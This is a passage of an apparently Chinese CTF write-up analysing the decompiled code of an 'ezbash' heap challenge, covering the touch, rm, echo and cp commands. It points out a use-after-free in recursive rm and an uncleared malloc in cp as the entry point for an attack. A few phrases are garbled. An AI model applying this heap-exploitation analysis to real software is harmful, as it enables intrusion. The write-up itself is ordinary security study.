class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">atouch</span><span class=\"params\">(<span class=\"type\">char</span> **cmd)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> v1; <span class=\"comment\">// al</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v3[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+1Ah] [rbp-16h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+1Ch] [rbp-14h]</span></span><br><span class=\"line\">  file *v5; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  file *v6; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = <span class=\"number\">1</span>;</span><br><span class=\"line\">  qmemcpy(v3, <span class=\"string\">&quot;./&quot;</span>, <span class=\"keyword\">sizeof</span>(v3));</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !cmd[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;ezbash: missing operand\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x18</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( cmd[v4] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"built_in\">strchr</span>(cmd[v4], v3[<span class=\"number\">0</span>]) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++v4;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( <span class=\"built_in\">strchr</span>(cmd[v4], v3[<span class=\"number\">1</span>]) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++v4;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v5 = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">      ((&amp;check_error + <span class=\"number\">1</span>))();</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v1 != <span class=\"number\">1</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        ++v4;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v6 = calloc40();</span><br><span class=\"line\">        v6-&gt;flag = <span class=\"number\">1</span>;</span><br><span class=\"line\">        copy_name(v6, cmd[v4]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( cuurr_pos-&gt;firstson )</span><br><span class=\"line\">          link(v5, v6);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">          cuurr_pos-&gt;firstson = v6;</span><br><span class=\"line\">        ++v4;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>mkdir 与 touch 创建新的 file 的时候，调用 calloc40，这个其实就是模拟了 calloc</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file *<span class=\"title function_\">malloc40</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  file *v1; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x40</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v1-&gt;name, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v1-&gt;name));</span><br><span class=\"line\">  v1-&gt;context = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v1-&gt;firstson = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v1-&gt;next_bro = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v1-&gt;prev_bro = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v1-&gt;futher = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">file *__fastcall <span class=\"title function_\">link</span><span class=\"params\">(file *curr, file *aim)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  file *result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( curr-&gt;next_bro )</span><br><span class=\"line\">    curr = curr-&gt;next_bro;</span><br><span class=\"line\">  curr-&gt;next_bro = aim;</span><br><span class=\"line\">  result = aim;</span><br><span class=\"line\">  aim-&gt;prev_bro = curr;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这也导致了，后面泄露地址有点困难。两个命令支持在当前目录下一次创建多个对象</p>\n<h4 id=\"rm\"><a class=\"markdownIt-Anchor\" href=\"#rm\">#</a> rm</h4>\n<p>rm 可以进行两种操作，直接删除文件，或者 - r 参数删除文件夹，但是都只是当前目录下的对象。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">arm</span><span class=\"params\">(<span class=\"type\">char</span> **cmd)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> v2; <span class=\"comment\">// [rsp+1Bh] [rbp-15h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+1Ch] [rbp-14h]</span></span><br><span class=\"line\">  file *file; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  file *ptr; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !cmd[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;ezbash: missing operand\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x18</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( cmd[v3] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    file = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">    v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(cmd[v3], <span class=\"string\">&quot;-r&quot;</span>) )               <span class=\"comment\">// -r</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( cmd[++v3] )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> ( file )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(file-&gt;name, cmd[v3]) )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            v2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( !checkfolder(file) )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash -r: cannot remove &#x27;%s&#x27;: Is a file\\n&quot;</span>, cmd[v3]);</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> LABEL_26;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">memset</span>(file-&gt;name, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(file-&gt;name));</span><br><span class=\"line\">            file-&gt;futher = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( file-&gt;firstson )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              ptr = file-&gt;firstson;</span><br><span class=\"line\">              <span class=\"keyword\">do</span></span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ( ptr-&gt;context )</span><br><span class=\"line\">                  <span class=\"built_in\">free</span>(ptr-&gt;context);</span><br><span class=\"line\">                <span class=\"built_in\">free</span>(ptr);                      <span class=\"comment\">// uaf</span></span><br><span class=\"line\">                                                <span class=\"comment\">// </span></span><br><span class=\"line\">                ptr = ptr-&gt;next_bro;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">while</span> ( ptr );</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">goto</span> LABEL_14;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          file = file-&gt;next_bro;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_26;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      ++v3;</span><br><span class=\"line\">    &#125;                                           <span class=\"comment\">// 删除单文件</span></span><br><span class=\"line\">                                                <span class=\"comment\">// </span></span><br><span class=\"line\">                                                <span class=\"comment\">// </span></span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">while</span> ( file )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(file-&gt;name, cmd[v3]) )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          v2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( checkfile(file) )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            <span class=\"built_in\">memset</span>(file-&gt;name, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(file-&gt;name));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( file-&gt;context )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"built_in\">free</span>(file-&gt;context);</span><br><span class=\"line\">              file-&gt;context = <span class=\"number\">0LL</span>;              <span class=\"comment\">// 没有uaf</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">LABEL_14:</span><br><span class=\"line\">            unlink(file);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">else</span></span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: &#x27;%s&#x27;: Is a directory\\n&quot;</span>, cmd[v3]);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        file = file-&gt;next_bro;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">LABEL_26:</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v2 != <span class=\"number\">1</span> )</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: &#x27;%s&#x27;: No such file or directory\\n&quot;</span>, cmd[v3]);</span><br><span class=\"line\">      ++v3;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"type\">void</span> __fastcall <span class=\"title function_\">unlink</span><span class=\"params\">(file *a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1-&gt;next_bro )</span><br><span class=\"line\">    a1-&gt;next_bro-&gt;prev_bro = a1-&gt;prev_bro;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1-&gt;prev_bro )</span><br><span class=\"line\">    a1-&gt;prev_bro-&gt;next_bro = a1-&gt;next_bro;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    cuurr_pos-&gt;firstson = a1-&gt;next_bro;</span><br><span class=\"line\">  a1-&gt;next_bro = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  a1-&gt;prev_bro = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(a1);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n<p>只可以堆当前目录的对象进行操作。当删除的目录下有子目录 x，不会破坏 x 的子文件链表结构，这里看似存在 uaf 名单时册灰姑娘徐每次创建 file 都会清空，所以无法利用。checkfile 以及 checkfolder 分别检查对象是文件还是文件夹。-r 不可删除文件。unlink 的操作也没有什么问题，</p>\n<h4 id=\"echo\"><a class=\"markdownIt-Anchor\" href=\"#echo\">#</a> echo</h4>\n<p>echo 支持两种操作，一个是将内容直接输出，一个是根据倒数第二个参数是否为 “-&gt;” 决定，不是，就直接输出，否则，就会将数据写进指定的 file。强调，一定是倒数第二参数。其他一律认为是内容，字符串不存在空格，是写进 context 的时候额外加入的。另外，echo 不可以将空字符写入。而且也不会在</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">aecho</span><span class=\"params\">(<span class=\"type\">char</span> **cmd)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  file *v3; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  file *v4; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> v5; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v6; <span class=\"comment\">// [rsp+14h] [rbp-3Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+14h] [rbp-3Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> j; <span class=\"comment\">// [rsp+14h] [rbp-3Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> chunksize; <span class=\"comment\">// [rsp+18h] [rbp-38h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> textlen; <span class=\"comment\">// [rsp+1Ch] [rbp-34h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> argv_nums; <span class=\"comment\">// [rsp+20h] [rbp-30h]</span></span><br><span class=\"line\">  file *file; <span class=\"comment\">// [rsp+28h] [rbp-28h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *filename; <span class=\"comment\">// [rsp+30h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v14; <span class=\"comment\">// [rsp+38h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v14 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v6 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( cmd[<span class=\"number\">1</span>] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">      ++v6;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( cmd[v6] );</span><br><span class=\"line\">    argv_nums = v6 - <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( tofile(cmd[v6 - <span class=\"number\">2</span>]) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( i = <span class=\"number\">1</span>; i &lt; argv_nums; ++i )</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s &quot;</span>, cmd[i]);</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(cmd[argv_nums]);</span><br><span class=\"line\">      result = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;                                           <span class=\"comment\">// 写入文件</span></span><br><span class=\"line\">      file = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">      filename = cmd[argv_nums];</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( findfile(&amp;file, filename) != <span class=\"number\">1</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: %s: No such file\\n&quot;</span>, filename);</span><br><span class=\"line\">        result = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( checkfile(file) )               <span class=\"comment\">// 检查是否为文件</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        textlen = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( file-&gt;context )                    <span class=\"comment\">// 已经写过了</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          size = get_chunk_size(file-&gt;context);</span><br><span class=\"line\">          <span class=\"built_in\">memset</span>(file-&gt;context, <span class=\"number\">0</span>, size);       <span class=\"comment\">// 清空</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> ( j = <span class=\"number\">1</span>; j &lt; argv_nums - <span class=\"number\">1</span>; ++j )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( file-&gt;context )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            chunksize = get_chunk_size(file-&gt;context);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">else</span>                                  <span class=\"comment\">// 空的，申请</span></span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            chunksize = <span class=\"number\">0x150</span>;</span><br><span class=\"line\">            v3 = file;</span><br><span class=\"line\">            v3-&gt;context = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x150</span>uLL);</span><br><span class=\"line\">            <span class=\"built_in\">memset</span>(file-&gt;context, <span class=\"number\">0</span>, <span class=\"number\">0x150</span>uLL);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          textlen += <span class=\"built_in\">strlen</span>(cmd[j]) + <span class=\"number\">2</span>;</span><br><span class=\"line\">          <span class=\"keyword\">while</span> ( textlen &gt;= chunksize )</span><br><span class=\"line\">            chunksize += <span class=\"number\">0x150</span>;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( chunksize &gt; get_chunk_size(file-&gt;context) )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            v4 = file;</span><br><span class=\"line\">            v4-&gt;context = <span class=\"built_in\">realloc</span>(file-&gt;context, chunksize);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          v5 = <span class=\"built_in\">strlen</span>(cmd[j]);</span><br><span class=\"line\">          <span class=\"built_in\">strncat</span>(file-&gt;context, cmd[j], v5);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( j &lt; argv_nums - <span class=\"number\">2</span> )</span><br><span class=\"line\">            *(file-&gt;context + <span class=\"built_in\">strlen</span>(file-&gt;context)) = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        result = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: %s: Is a directory\\n&quot;</span>, filename);</span><br><span class=\"line\">        result = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">putchar</span>(<span class=\"number\">10</span>);</span><br><span class=\"line\">    result = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/* Orphan comments:</span></span><br><span class=\"line\"><span class=\"comment\">stdout</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br></pre></td></tr></table></figure>\n<p>每次 echo，都会清空 context 的内容，而且是跟据 chunksize 清空的。并且如果写的数据大于等于 chunksize-2 就会把 context 调大。而且注意。</p>\n<h4 id=\"cp\"><a class=\"markdownIt-Anchor\" href=\"#cp\">#</a> cp</h4>\n<p>整个程序攻击的开始就是在 cp，cp 可以拷贝当前目录下的文件，一个是把他的内容拷贝到当前目录下的另一个文件里，起一个是拷贝到子文件夹下的文件里，如果指定的文件不存在，会自动创建。但是佟阿姨那个调用的是 calloc40，所以没有 uaf。问题在于对 context 的复制，目标文件没有 context 指针，会申请一个，重点来了，这里用的是 malloc，而且不会清空。如果我们要拷贝的文件没有 context，会把对应的目标文件的 context     free。或者直接创建一个新的空文件。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span 